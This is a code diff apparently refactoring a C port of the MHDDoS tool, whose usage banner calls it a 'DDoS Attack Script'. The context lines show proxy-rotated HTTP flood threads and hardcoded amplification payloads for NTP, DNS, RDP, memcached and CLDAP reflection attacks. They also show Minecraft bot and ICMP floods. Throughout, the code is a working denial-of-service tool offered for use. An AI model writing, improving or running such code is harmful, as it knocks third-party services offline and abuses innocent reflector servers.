@@ -12,7 +12,6 @@ static void usage(const char *prog) {
     const char *tools_methods = "INFO, TSSRV, CFIP, DNS, PING, CHECK, DSTAT";
     int tools_count = 7;
     int total = l4_count + l7_count + 3 + tools_count;
-
     printf(
         "* MHDDoS - DDoS Attack Script With %d Methods\n"
         "Note: If the Proxy list is empty, The attack will run without proxies\n"
@@ -49,12 +48,6 @@ static void usage(const char *prog) {
     fflush(stdout);
 }
 
-static void stop_all(void) {
-    printf("All Attacks has been Stopped !\n");
-    fflush(stdout);
-    exit(0);
-}
-
 static void set_amp_payload(layer4_args_t *args, const uint8_t *payload, int len, int port) {
     memcpy(args->amp_payload, payload, len);
     args->amp_payload_len = len;
@@ -63,10 +56,6 @@ static void set_amp_payload(layer4_args_t *args, const uint8_t *payload, int len
 
 int main(int argc, char *argv[]) {
     srand(time(NULL) ^ getpid());
-    SSL_library_init();
-    SSL_load_error_strings();
-    OpenSSL_add_all_algorithms();
-
     get_local_ip(g_local_ip, sizeof(g_local_ip));
 
     if (argc < 2) {
@@ -83,13 +72,9 @@ int main(int argc, char *argv[]) {
         usage(argv[0]);
         return 0;
     }
-    if (strcmp(one, "TOOLS") == 0) {
-        printf("Tools console not available in C port\n");
-        fflush(stdout);
-        return 0;
-    }
     if (strcmp(one, "STOP") == 0) {
-        stop_all();
+        printf("All Attacks has been Stopped !\n");
+        fflush(stdout);
         return 0;
     }
 
@@ -111,7 +96,7 @@ int main(int argc, char *argv[]) {
     strncpy(urlraw, argv[2], sizeof(urlraw) - 1);
     {
         char *p = urlraw;
-        while (*p && (isspace((unsigned char)*p))) p++;
+        while (*p && isspace((unsigned char)*p)) p++;
         if (strncmp(p, "http", 4) != 0) {
             char tmp[4096];
             snprintf(tmp, sizeof(tmp), "http://%s", p);
@@ -130,12 +115,10 @@ int main(int argc, char *argv[]) {
 
         char host_ip[256];
         if (strcmp(one, "TOR") != 0) {
-            struct hostent *he = gethostbyname(target.host);
-            if (!he) {
+            if (!resolve_host(target.host, host_ip, sizeof(host_ip))) {
                 fprintf(stderr, BCOLORS_FAIL "Cannot resolve hostname %s" BCOLORS_RESET "\n", target.host);
                 return 1;
             }
-            inet_ntop(AF_INET, he->h_addr_list[0], host_ip, sizeof(host_ip));
         } else {
             strncpy(host_ip, target.host, sizeof(host_ip));
         }
@@ -147,24 +130,20 @@ int main(int argc, char *argv[]) {
 
         char proxy_path[512];
         snprintf(proxy_path, sizeof(proxy_path), "files/proxies/%s", argv[5]);
-        char ua_path[512];
-        snprintf(ua_path, sizeof(ua_path), "files/useragent.txt");
-        char ref_path[512];
-        snprintf(ref_path, sizeof(ref_path), "files/referers.txt");
 
         if (argc == 9) {
             fprintf(stderr, "[DEBUG MODE]\n");
         }
 
         char **useragents = NULL;
-        int ua_count = load_lines(ua_path, &useragents, MAX_USERAGENTS);
+        int ua_count = load_lines("files/useragent.txt", &useragents, MAX_USERAGENTS);
         if (ua_count == 0) {
             fprintf(stderr, BCOLORS_FAIL "The Useragent file doesn't exist " BCOLORS_RESET "\n");
             return 1;
         }
 
         char **referers = NULL;
-        int ref_count = load_lines(ref_path, &referers, MAX_REFERERS);
+        int ref_count = load_lines("files/referers.txt", &referers, MAX_REFERERS);
         if (ref_count == 0) {
             fprintf(stderr, BCOLORS_FAIL "The Referer file doesn't exist " BCOLORS_RESET "\n");
             return 1;
@@ -177,7 +156,6 @@ int main(int argc, char *argv[]) {
 
         proxy_t *proxies = NULL;
         int proxy_count = 0;
-
         proxy_type_t pt = (proxy_type_t)proxy_ty;
         if (pt == PROXY_RANDOM) pt = (proxy_type_t)(1 + (rand() % 3));
         if (pt != PROXY_NONE) {
@@ -193,10 +171,6 @@ int main(int argc, char *argv[]) {
                 }
             }
         }
-
-        SSL_CTX *ssl_ctx = SSL_CTX_new(TLS_client_method());
-        SSL_CTX_set_verify(ssl_ctx, SSL_VERIFY_NONE, NULL);
-        SSL_CTX_set_min_proto_version(ssl_ctx, TLS1_2_VERSION);
 
         pthread_t *tids = malloc(sizeof(pthread_t) * threads);
         layer7_args_t *thread_args = calloc(threads, sizeof(layer7_args_t));
@@ -214,7 +188,7 @@ int main(int argc, char *argv[]) {
             thread_args[i].referers = referers;
             thread_args[i].referer_count = ref_count;
             thread_args[i].running = &running;
-            thread_args[i].ssl_ctx = ssl_ctx;
+            thread_args[i].use_ssl = (strcasecmp(target.scheme, "https") == 0);
             strncpy(thread_args[i].local_ip, g_local_ip, sizeof(thread_args[i].local_ip));
             pthread_create(&tids[i], NULL, layer7_thread, &thread_args[i]);
         }
@@ -243,10 +217,8 @@ int main(int argc, char *argv[]) {
             fflush(stdout);
             sleep(1);
         }
-
         running = 0;
         sleep(1);
-        SSL_CTX_free(ssl_ctx);
         free(thread_args);
         free(tids);
         if (proxies) free(proxies);
@@ -261,12 +233,10 @@ int main(int argc, char *argv[]) {
         parse_url(urlraw, &target);
 
         char target_ip[256];
-        struct hostent *he = gethostbyname(target.host);
-        if (!he) {
+        if (!resolve_host(target.host, target_ip, sizeof(target_ip))) {
             fprintf(stderr, BCOLORS_FAIL "Cannot resolve hostname %s" BCOLORS_RESET "\n", target.host);
             return 1;
         }
-        inet_ntop(AF_INET, he->h_addr_list[0], target_ip, sizeof(target_ip));
 
         int port = target.port;
         if (port > 65535 || port < 1) {
@@ -302,7 +272,6 @@ int main(int argc, char *argv[]) {
         if (argc >= 6) {
             char *argfive = argv[5];
             while (*argfive && isspace((unsigned char)*argfive)) argfive++;
-
             if (strlen(argfive) > 0) {
                 if (method == METHOD_NTP || method == METHOD_DNS_AMP || method == METHOD_RDP ||
                     method == METHOD_CHAR || method == METHOD_MEM || method == METHOD_CLDAP ||
@@ -314,32 +283,20 @@ int main(int argc, char *argv[]) {
                         fprintf(stderr, BCOLORS_FAIL "The reflector file doesn't exist" BCOLORS_RESET "\n");
                         return 1;
                     }
-                    if (argc == 7) {
-                        fprintf(stderr, "[DEBUG MODE]\n");
-                    }
+                    if (argc == 7) fprintf(stderr, "[DEBUG MODE]\n");
                     refs = malloc(sizeof(char*) * MAX_REFS);
                     char line[256];
                     while (fgets(line, sizeof(line), rf) && ref_count < MAX_REFS) {
                         line[strcspn(line, "\r\n")] = 0;
-                        if (strlen(line) > 6) {
-                            refs[ref_count] = strdup(line);
-                            ref_count++;
-                        }
+                        if (strlen(line) > 6) { refs[ref_count++] = strdup(line); }
                     }
                     fclose(rf);
-                    if (ref_count == 0) {
-                        fprintf(stderr, BCOLORS_FAIL "Empty Reflector File " BCOLORS_RESET "\n");
-                        return 1;
-                    }
+                    if (ref_count == 0) { fprintf(stderr, BCOLORS_FAIL "Empty Reflector File " BCOLORS_RESET "\n"); return 1; }
                 } else {
                     int is_digit = 1;
-                    for (int i = 0; argfive[i]; i++) {
-                        if (!isdigit((unsigned char)argfive[i])) { is_digit = 0; break; }
-                    }
+                    for (int i = 0; argfive[i]; i++) if (!isdigit((unsigned char)argfive[i])) { is_digit = 0; break; }
                     if (is_digit && argc >= 7) {
-                        if (argc == 8) {
-                            fprintf(stderr, "[DEBUG MODE]\n");
-                        }
+                        if (argc == 8) fprintf(stderr, "[DEBUG MODE]\n");
                         int proxy_ty = atoi(argfive);
                         proxy_type_t pt = (proxy_type_t)proxy_ty;
                         if (pt == PROXY_RANDOM) pt = (proxy_type_t)(1 + (rand() % 3));
@@ -352,8 +309,7 @@ int main(int argc, char *argv[]) {
                             else free(proxy_arr);
                         }
                         if (method != METHOD_MINECRAFT && method != METHOD_MCBOT &&
-                            method != METHOD_TCP && method != METHOD_CPS &&
-                            method != METHOD_CONNECTION) {
+                            method != METHOD_TCP && method != METHOD_CPS && method != METHOD_CONNECTION) {
                             fprintf(stderr, BCOLORS_FAIL "this method cannot use for layer4 proxy" BCOLORS_RESET "\n");
                             return 1;
                         }
@@ -365,7 +321,6 @@ int main(int argc, char *argv[]) {
         }
 
         int protocolid = MINECRAFT_DEFAULT_PROTOCOL;
-
         if (method == METHOD_MCBOT) {
             int probe = socket(AF_INET, SOCK_STREAM, 0);
             if (probe >= 0) {
@@ -391,8 +346,7 @@ int main(int argc, char *argv[]) {
                         char *p = strstr((char*)resp, "\"protocol\":");
                         if (p) {
                             int pv = atoi(p + 11);
-                            if (pv > 47 && pv < 758)
-                                protocolid = pv;
+                            if (pv > 47 && pv < 758) protocolid = pv;
                         }
                     }
                 }
@@ -414,9 +368,7 @@ int main(int argc, char *argv[]) {
             thread_args[i].ref_count = ref_count;
             thread_args[i].running = &running;
             strncpy(thread_args[i].local_ip, g_local_ip, sizeof(thread_args[i].local_ip));
-
-            if (method == METHOD_ICMP)
-                thread_args[i].target_port = 0;
+            if (method == METHOD_ICMP) thread_args[i].target_port = 0;
 
             if (method == METHOD_RDP) {
                 uint8_t p[] = {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
@@ -443,7 +395,6 @@ int main(int argc, char *argv[]) {
                                0x00,0x00,0xff,0x00,0x01,0x00,0x00,0x29,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00};
                 set_amp_payload(&thread_args[i], p, 31, 53);
             }
-
             pthread_create(&tids[i], NULL, layer4_thread, &thread_args[i]);
         }
 
@@ -471,13 +422,11 @@ int main(int argc, char *argv[]) {
             fflush(stdout);
             sleep(1);
         }
-
         running = 0;
         sleep(1);
         free(thread_args);
         free(tids);
         if (proxies) free(proxies);
-
     } else {
         usage(argv[0]);
     }
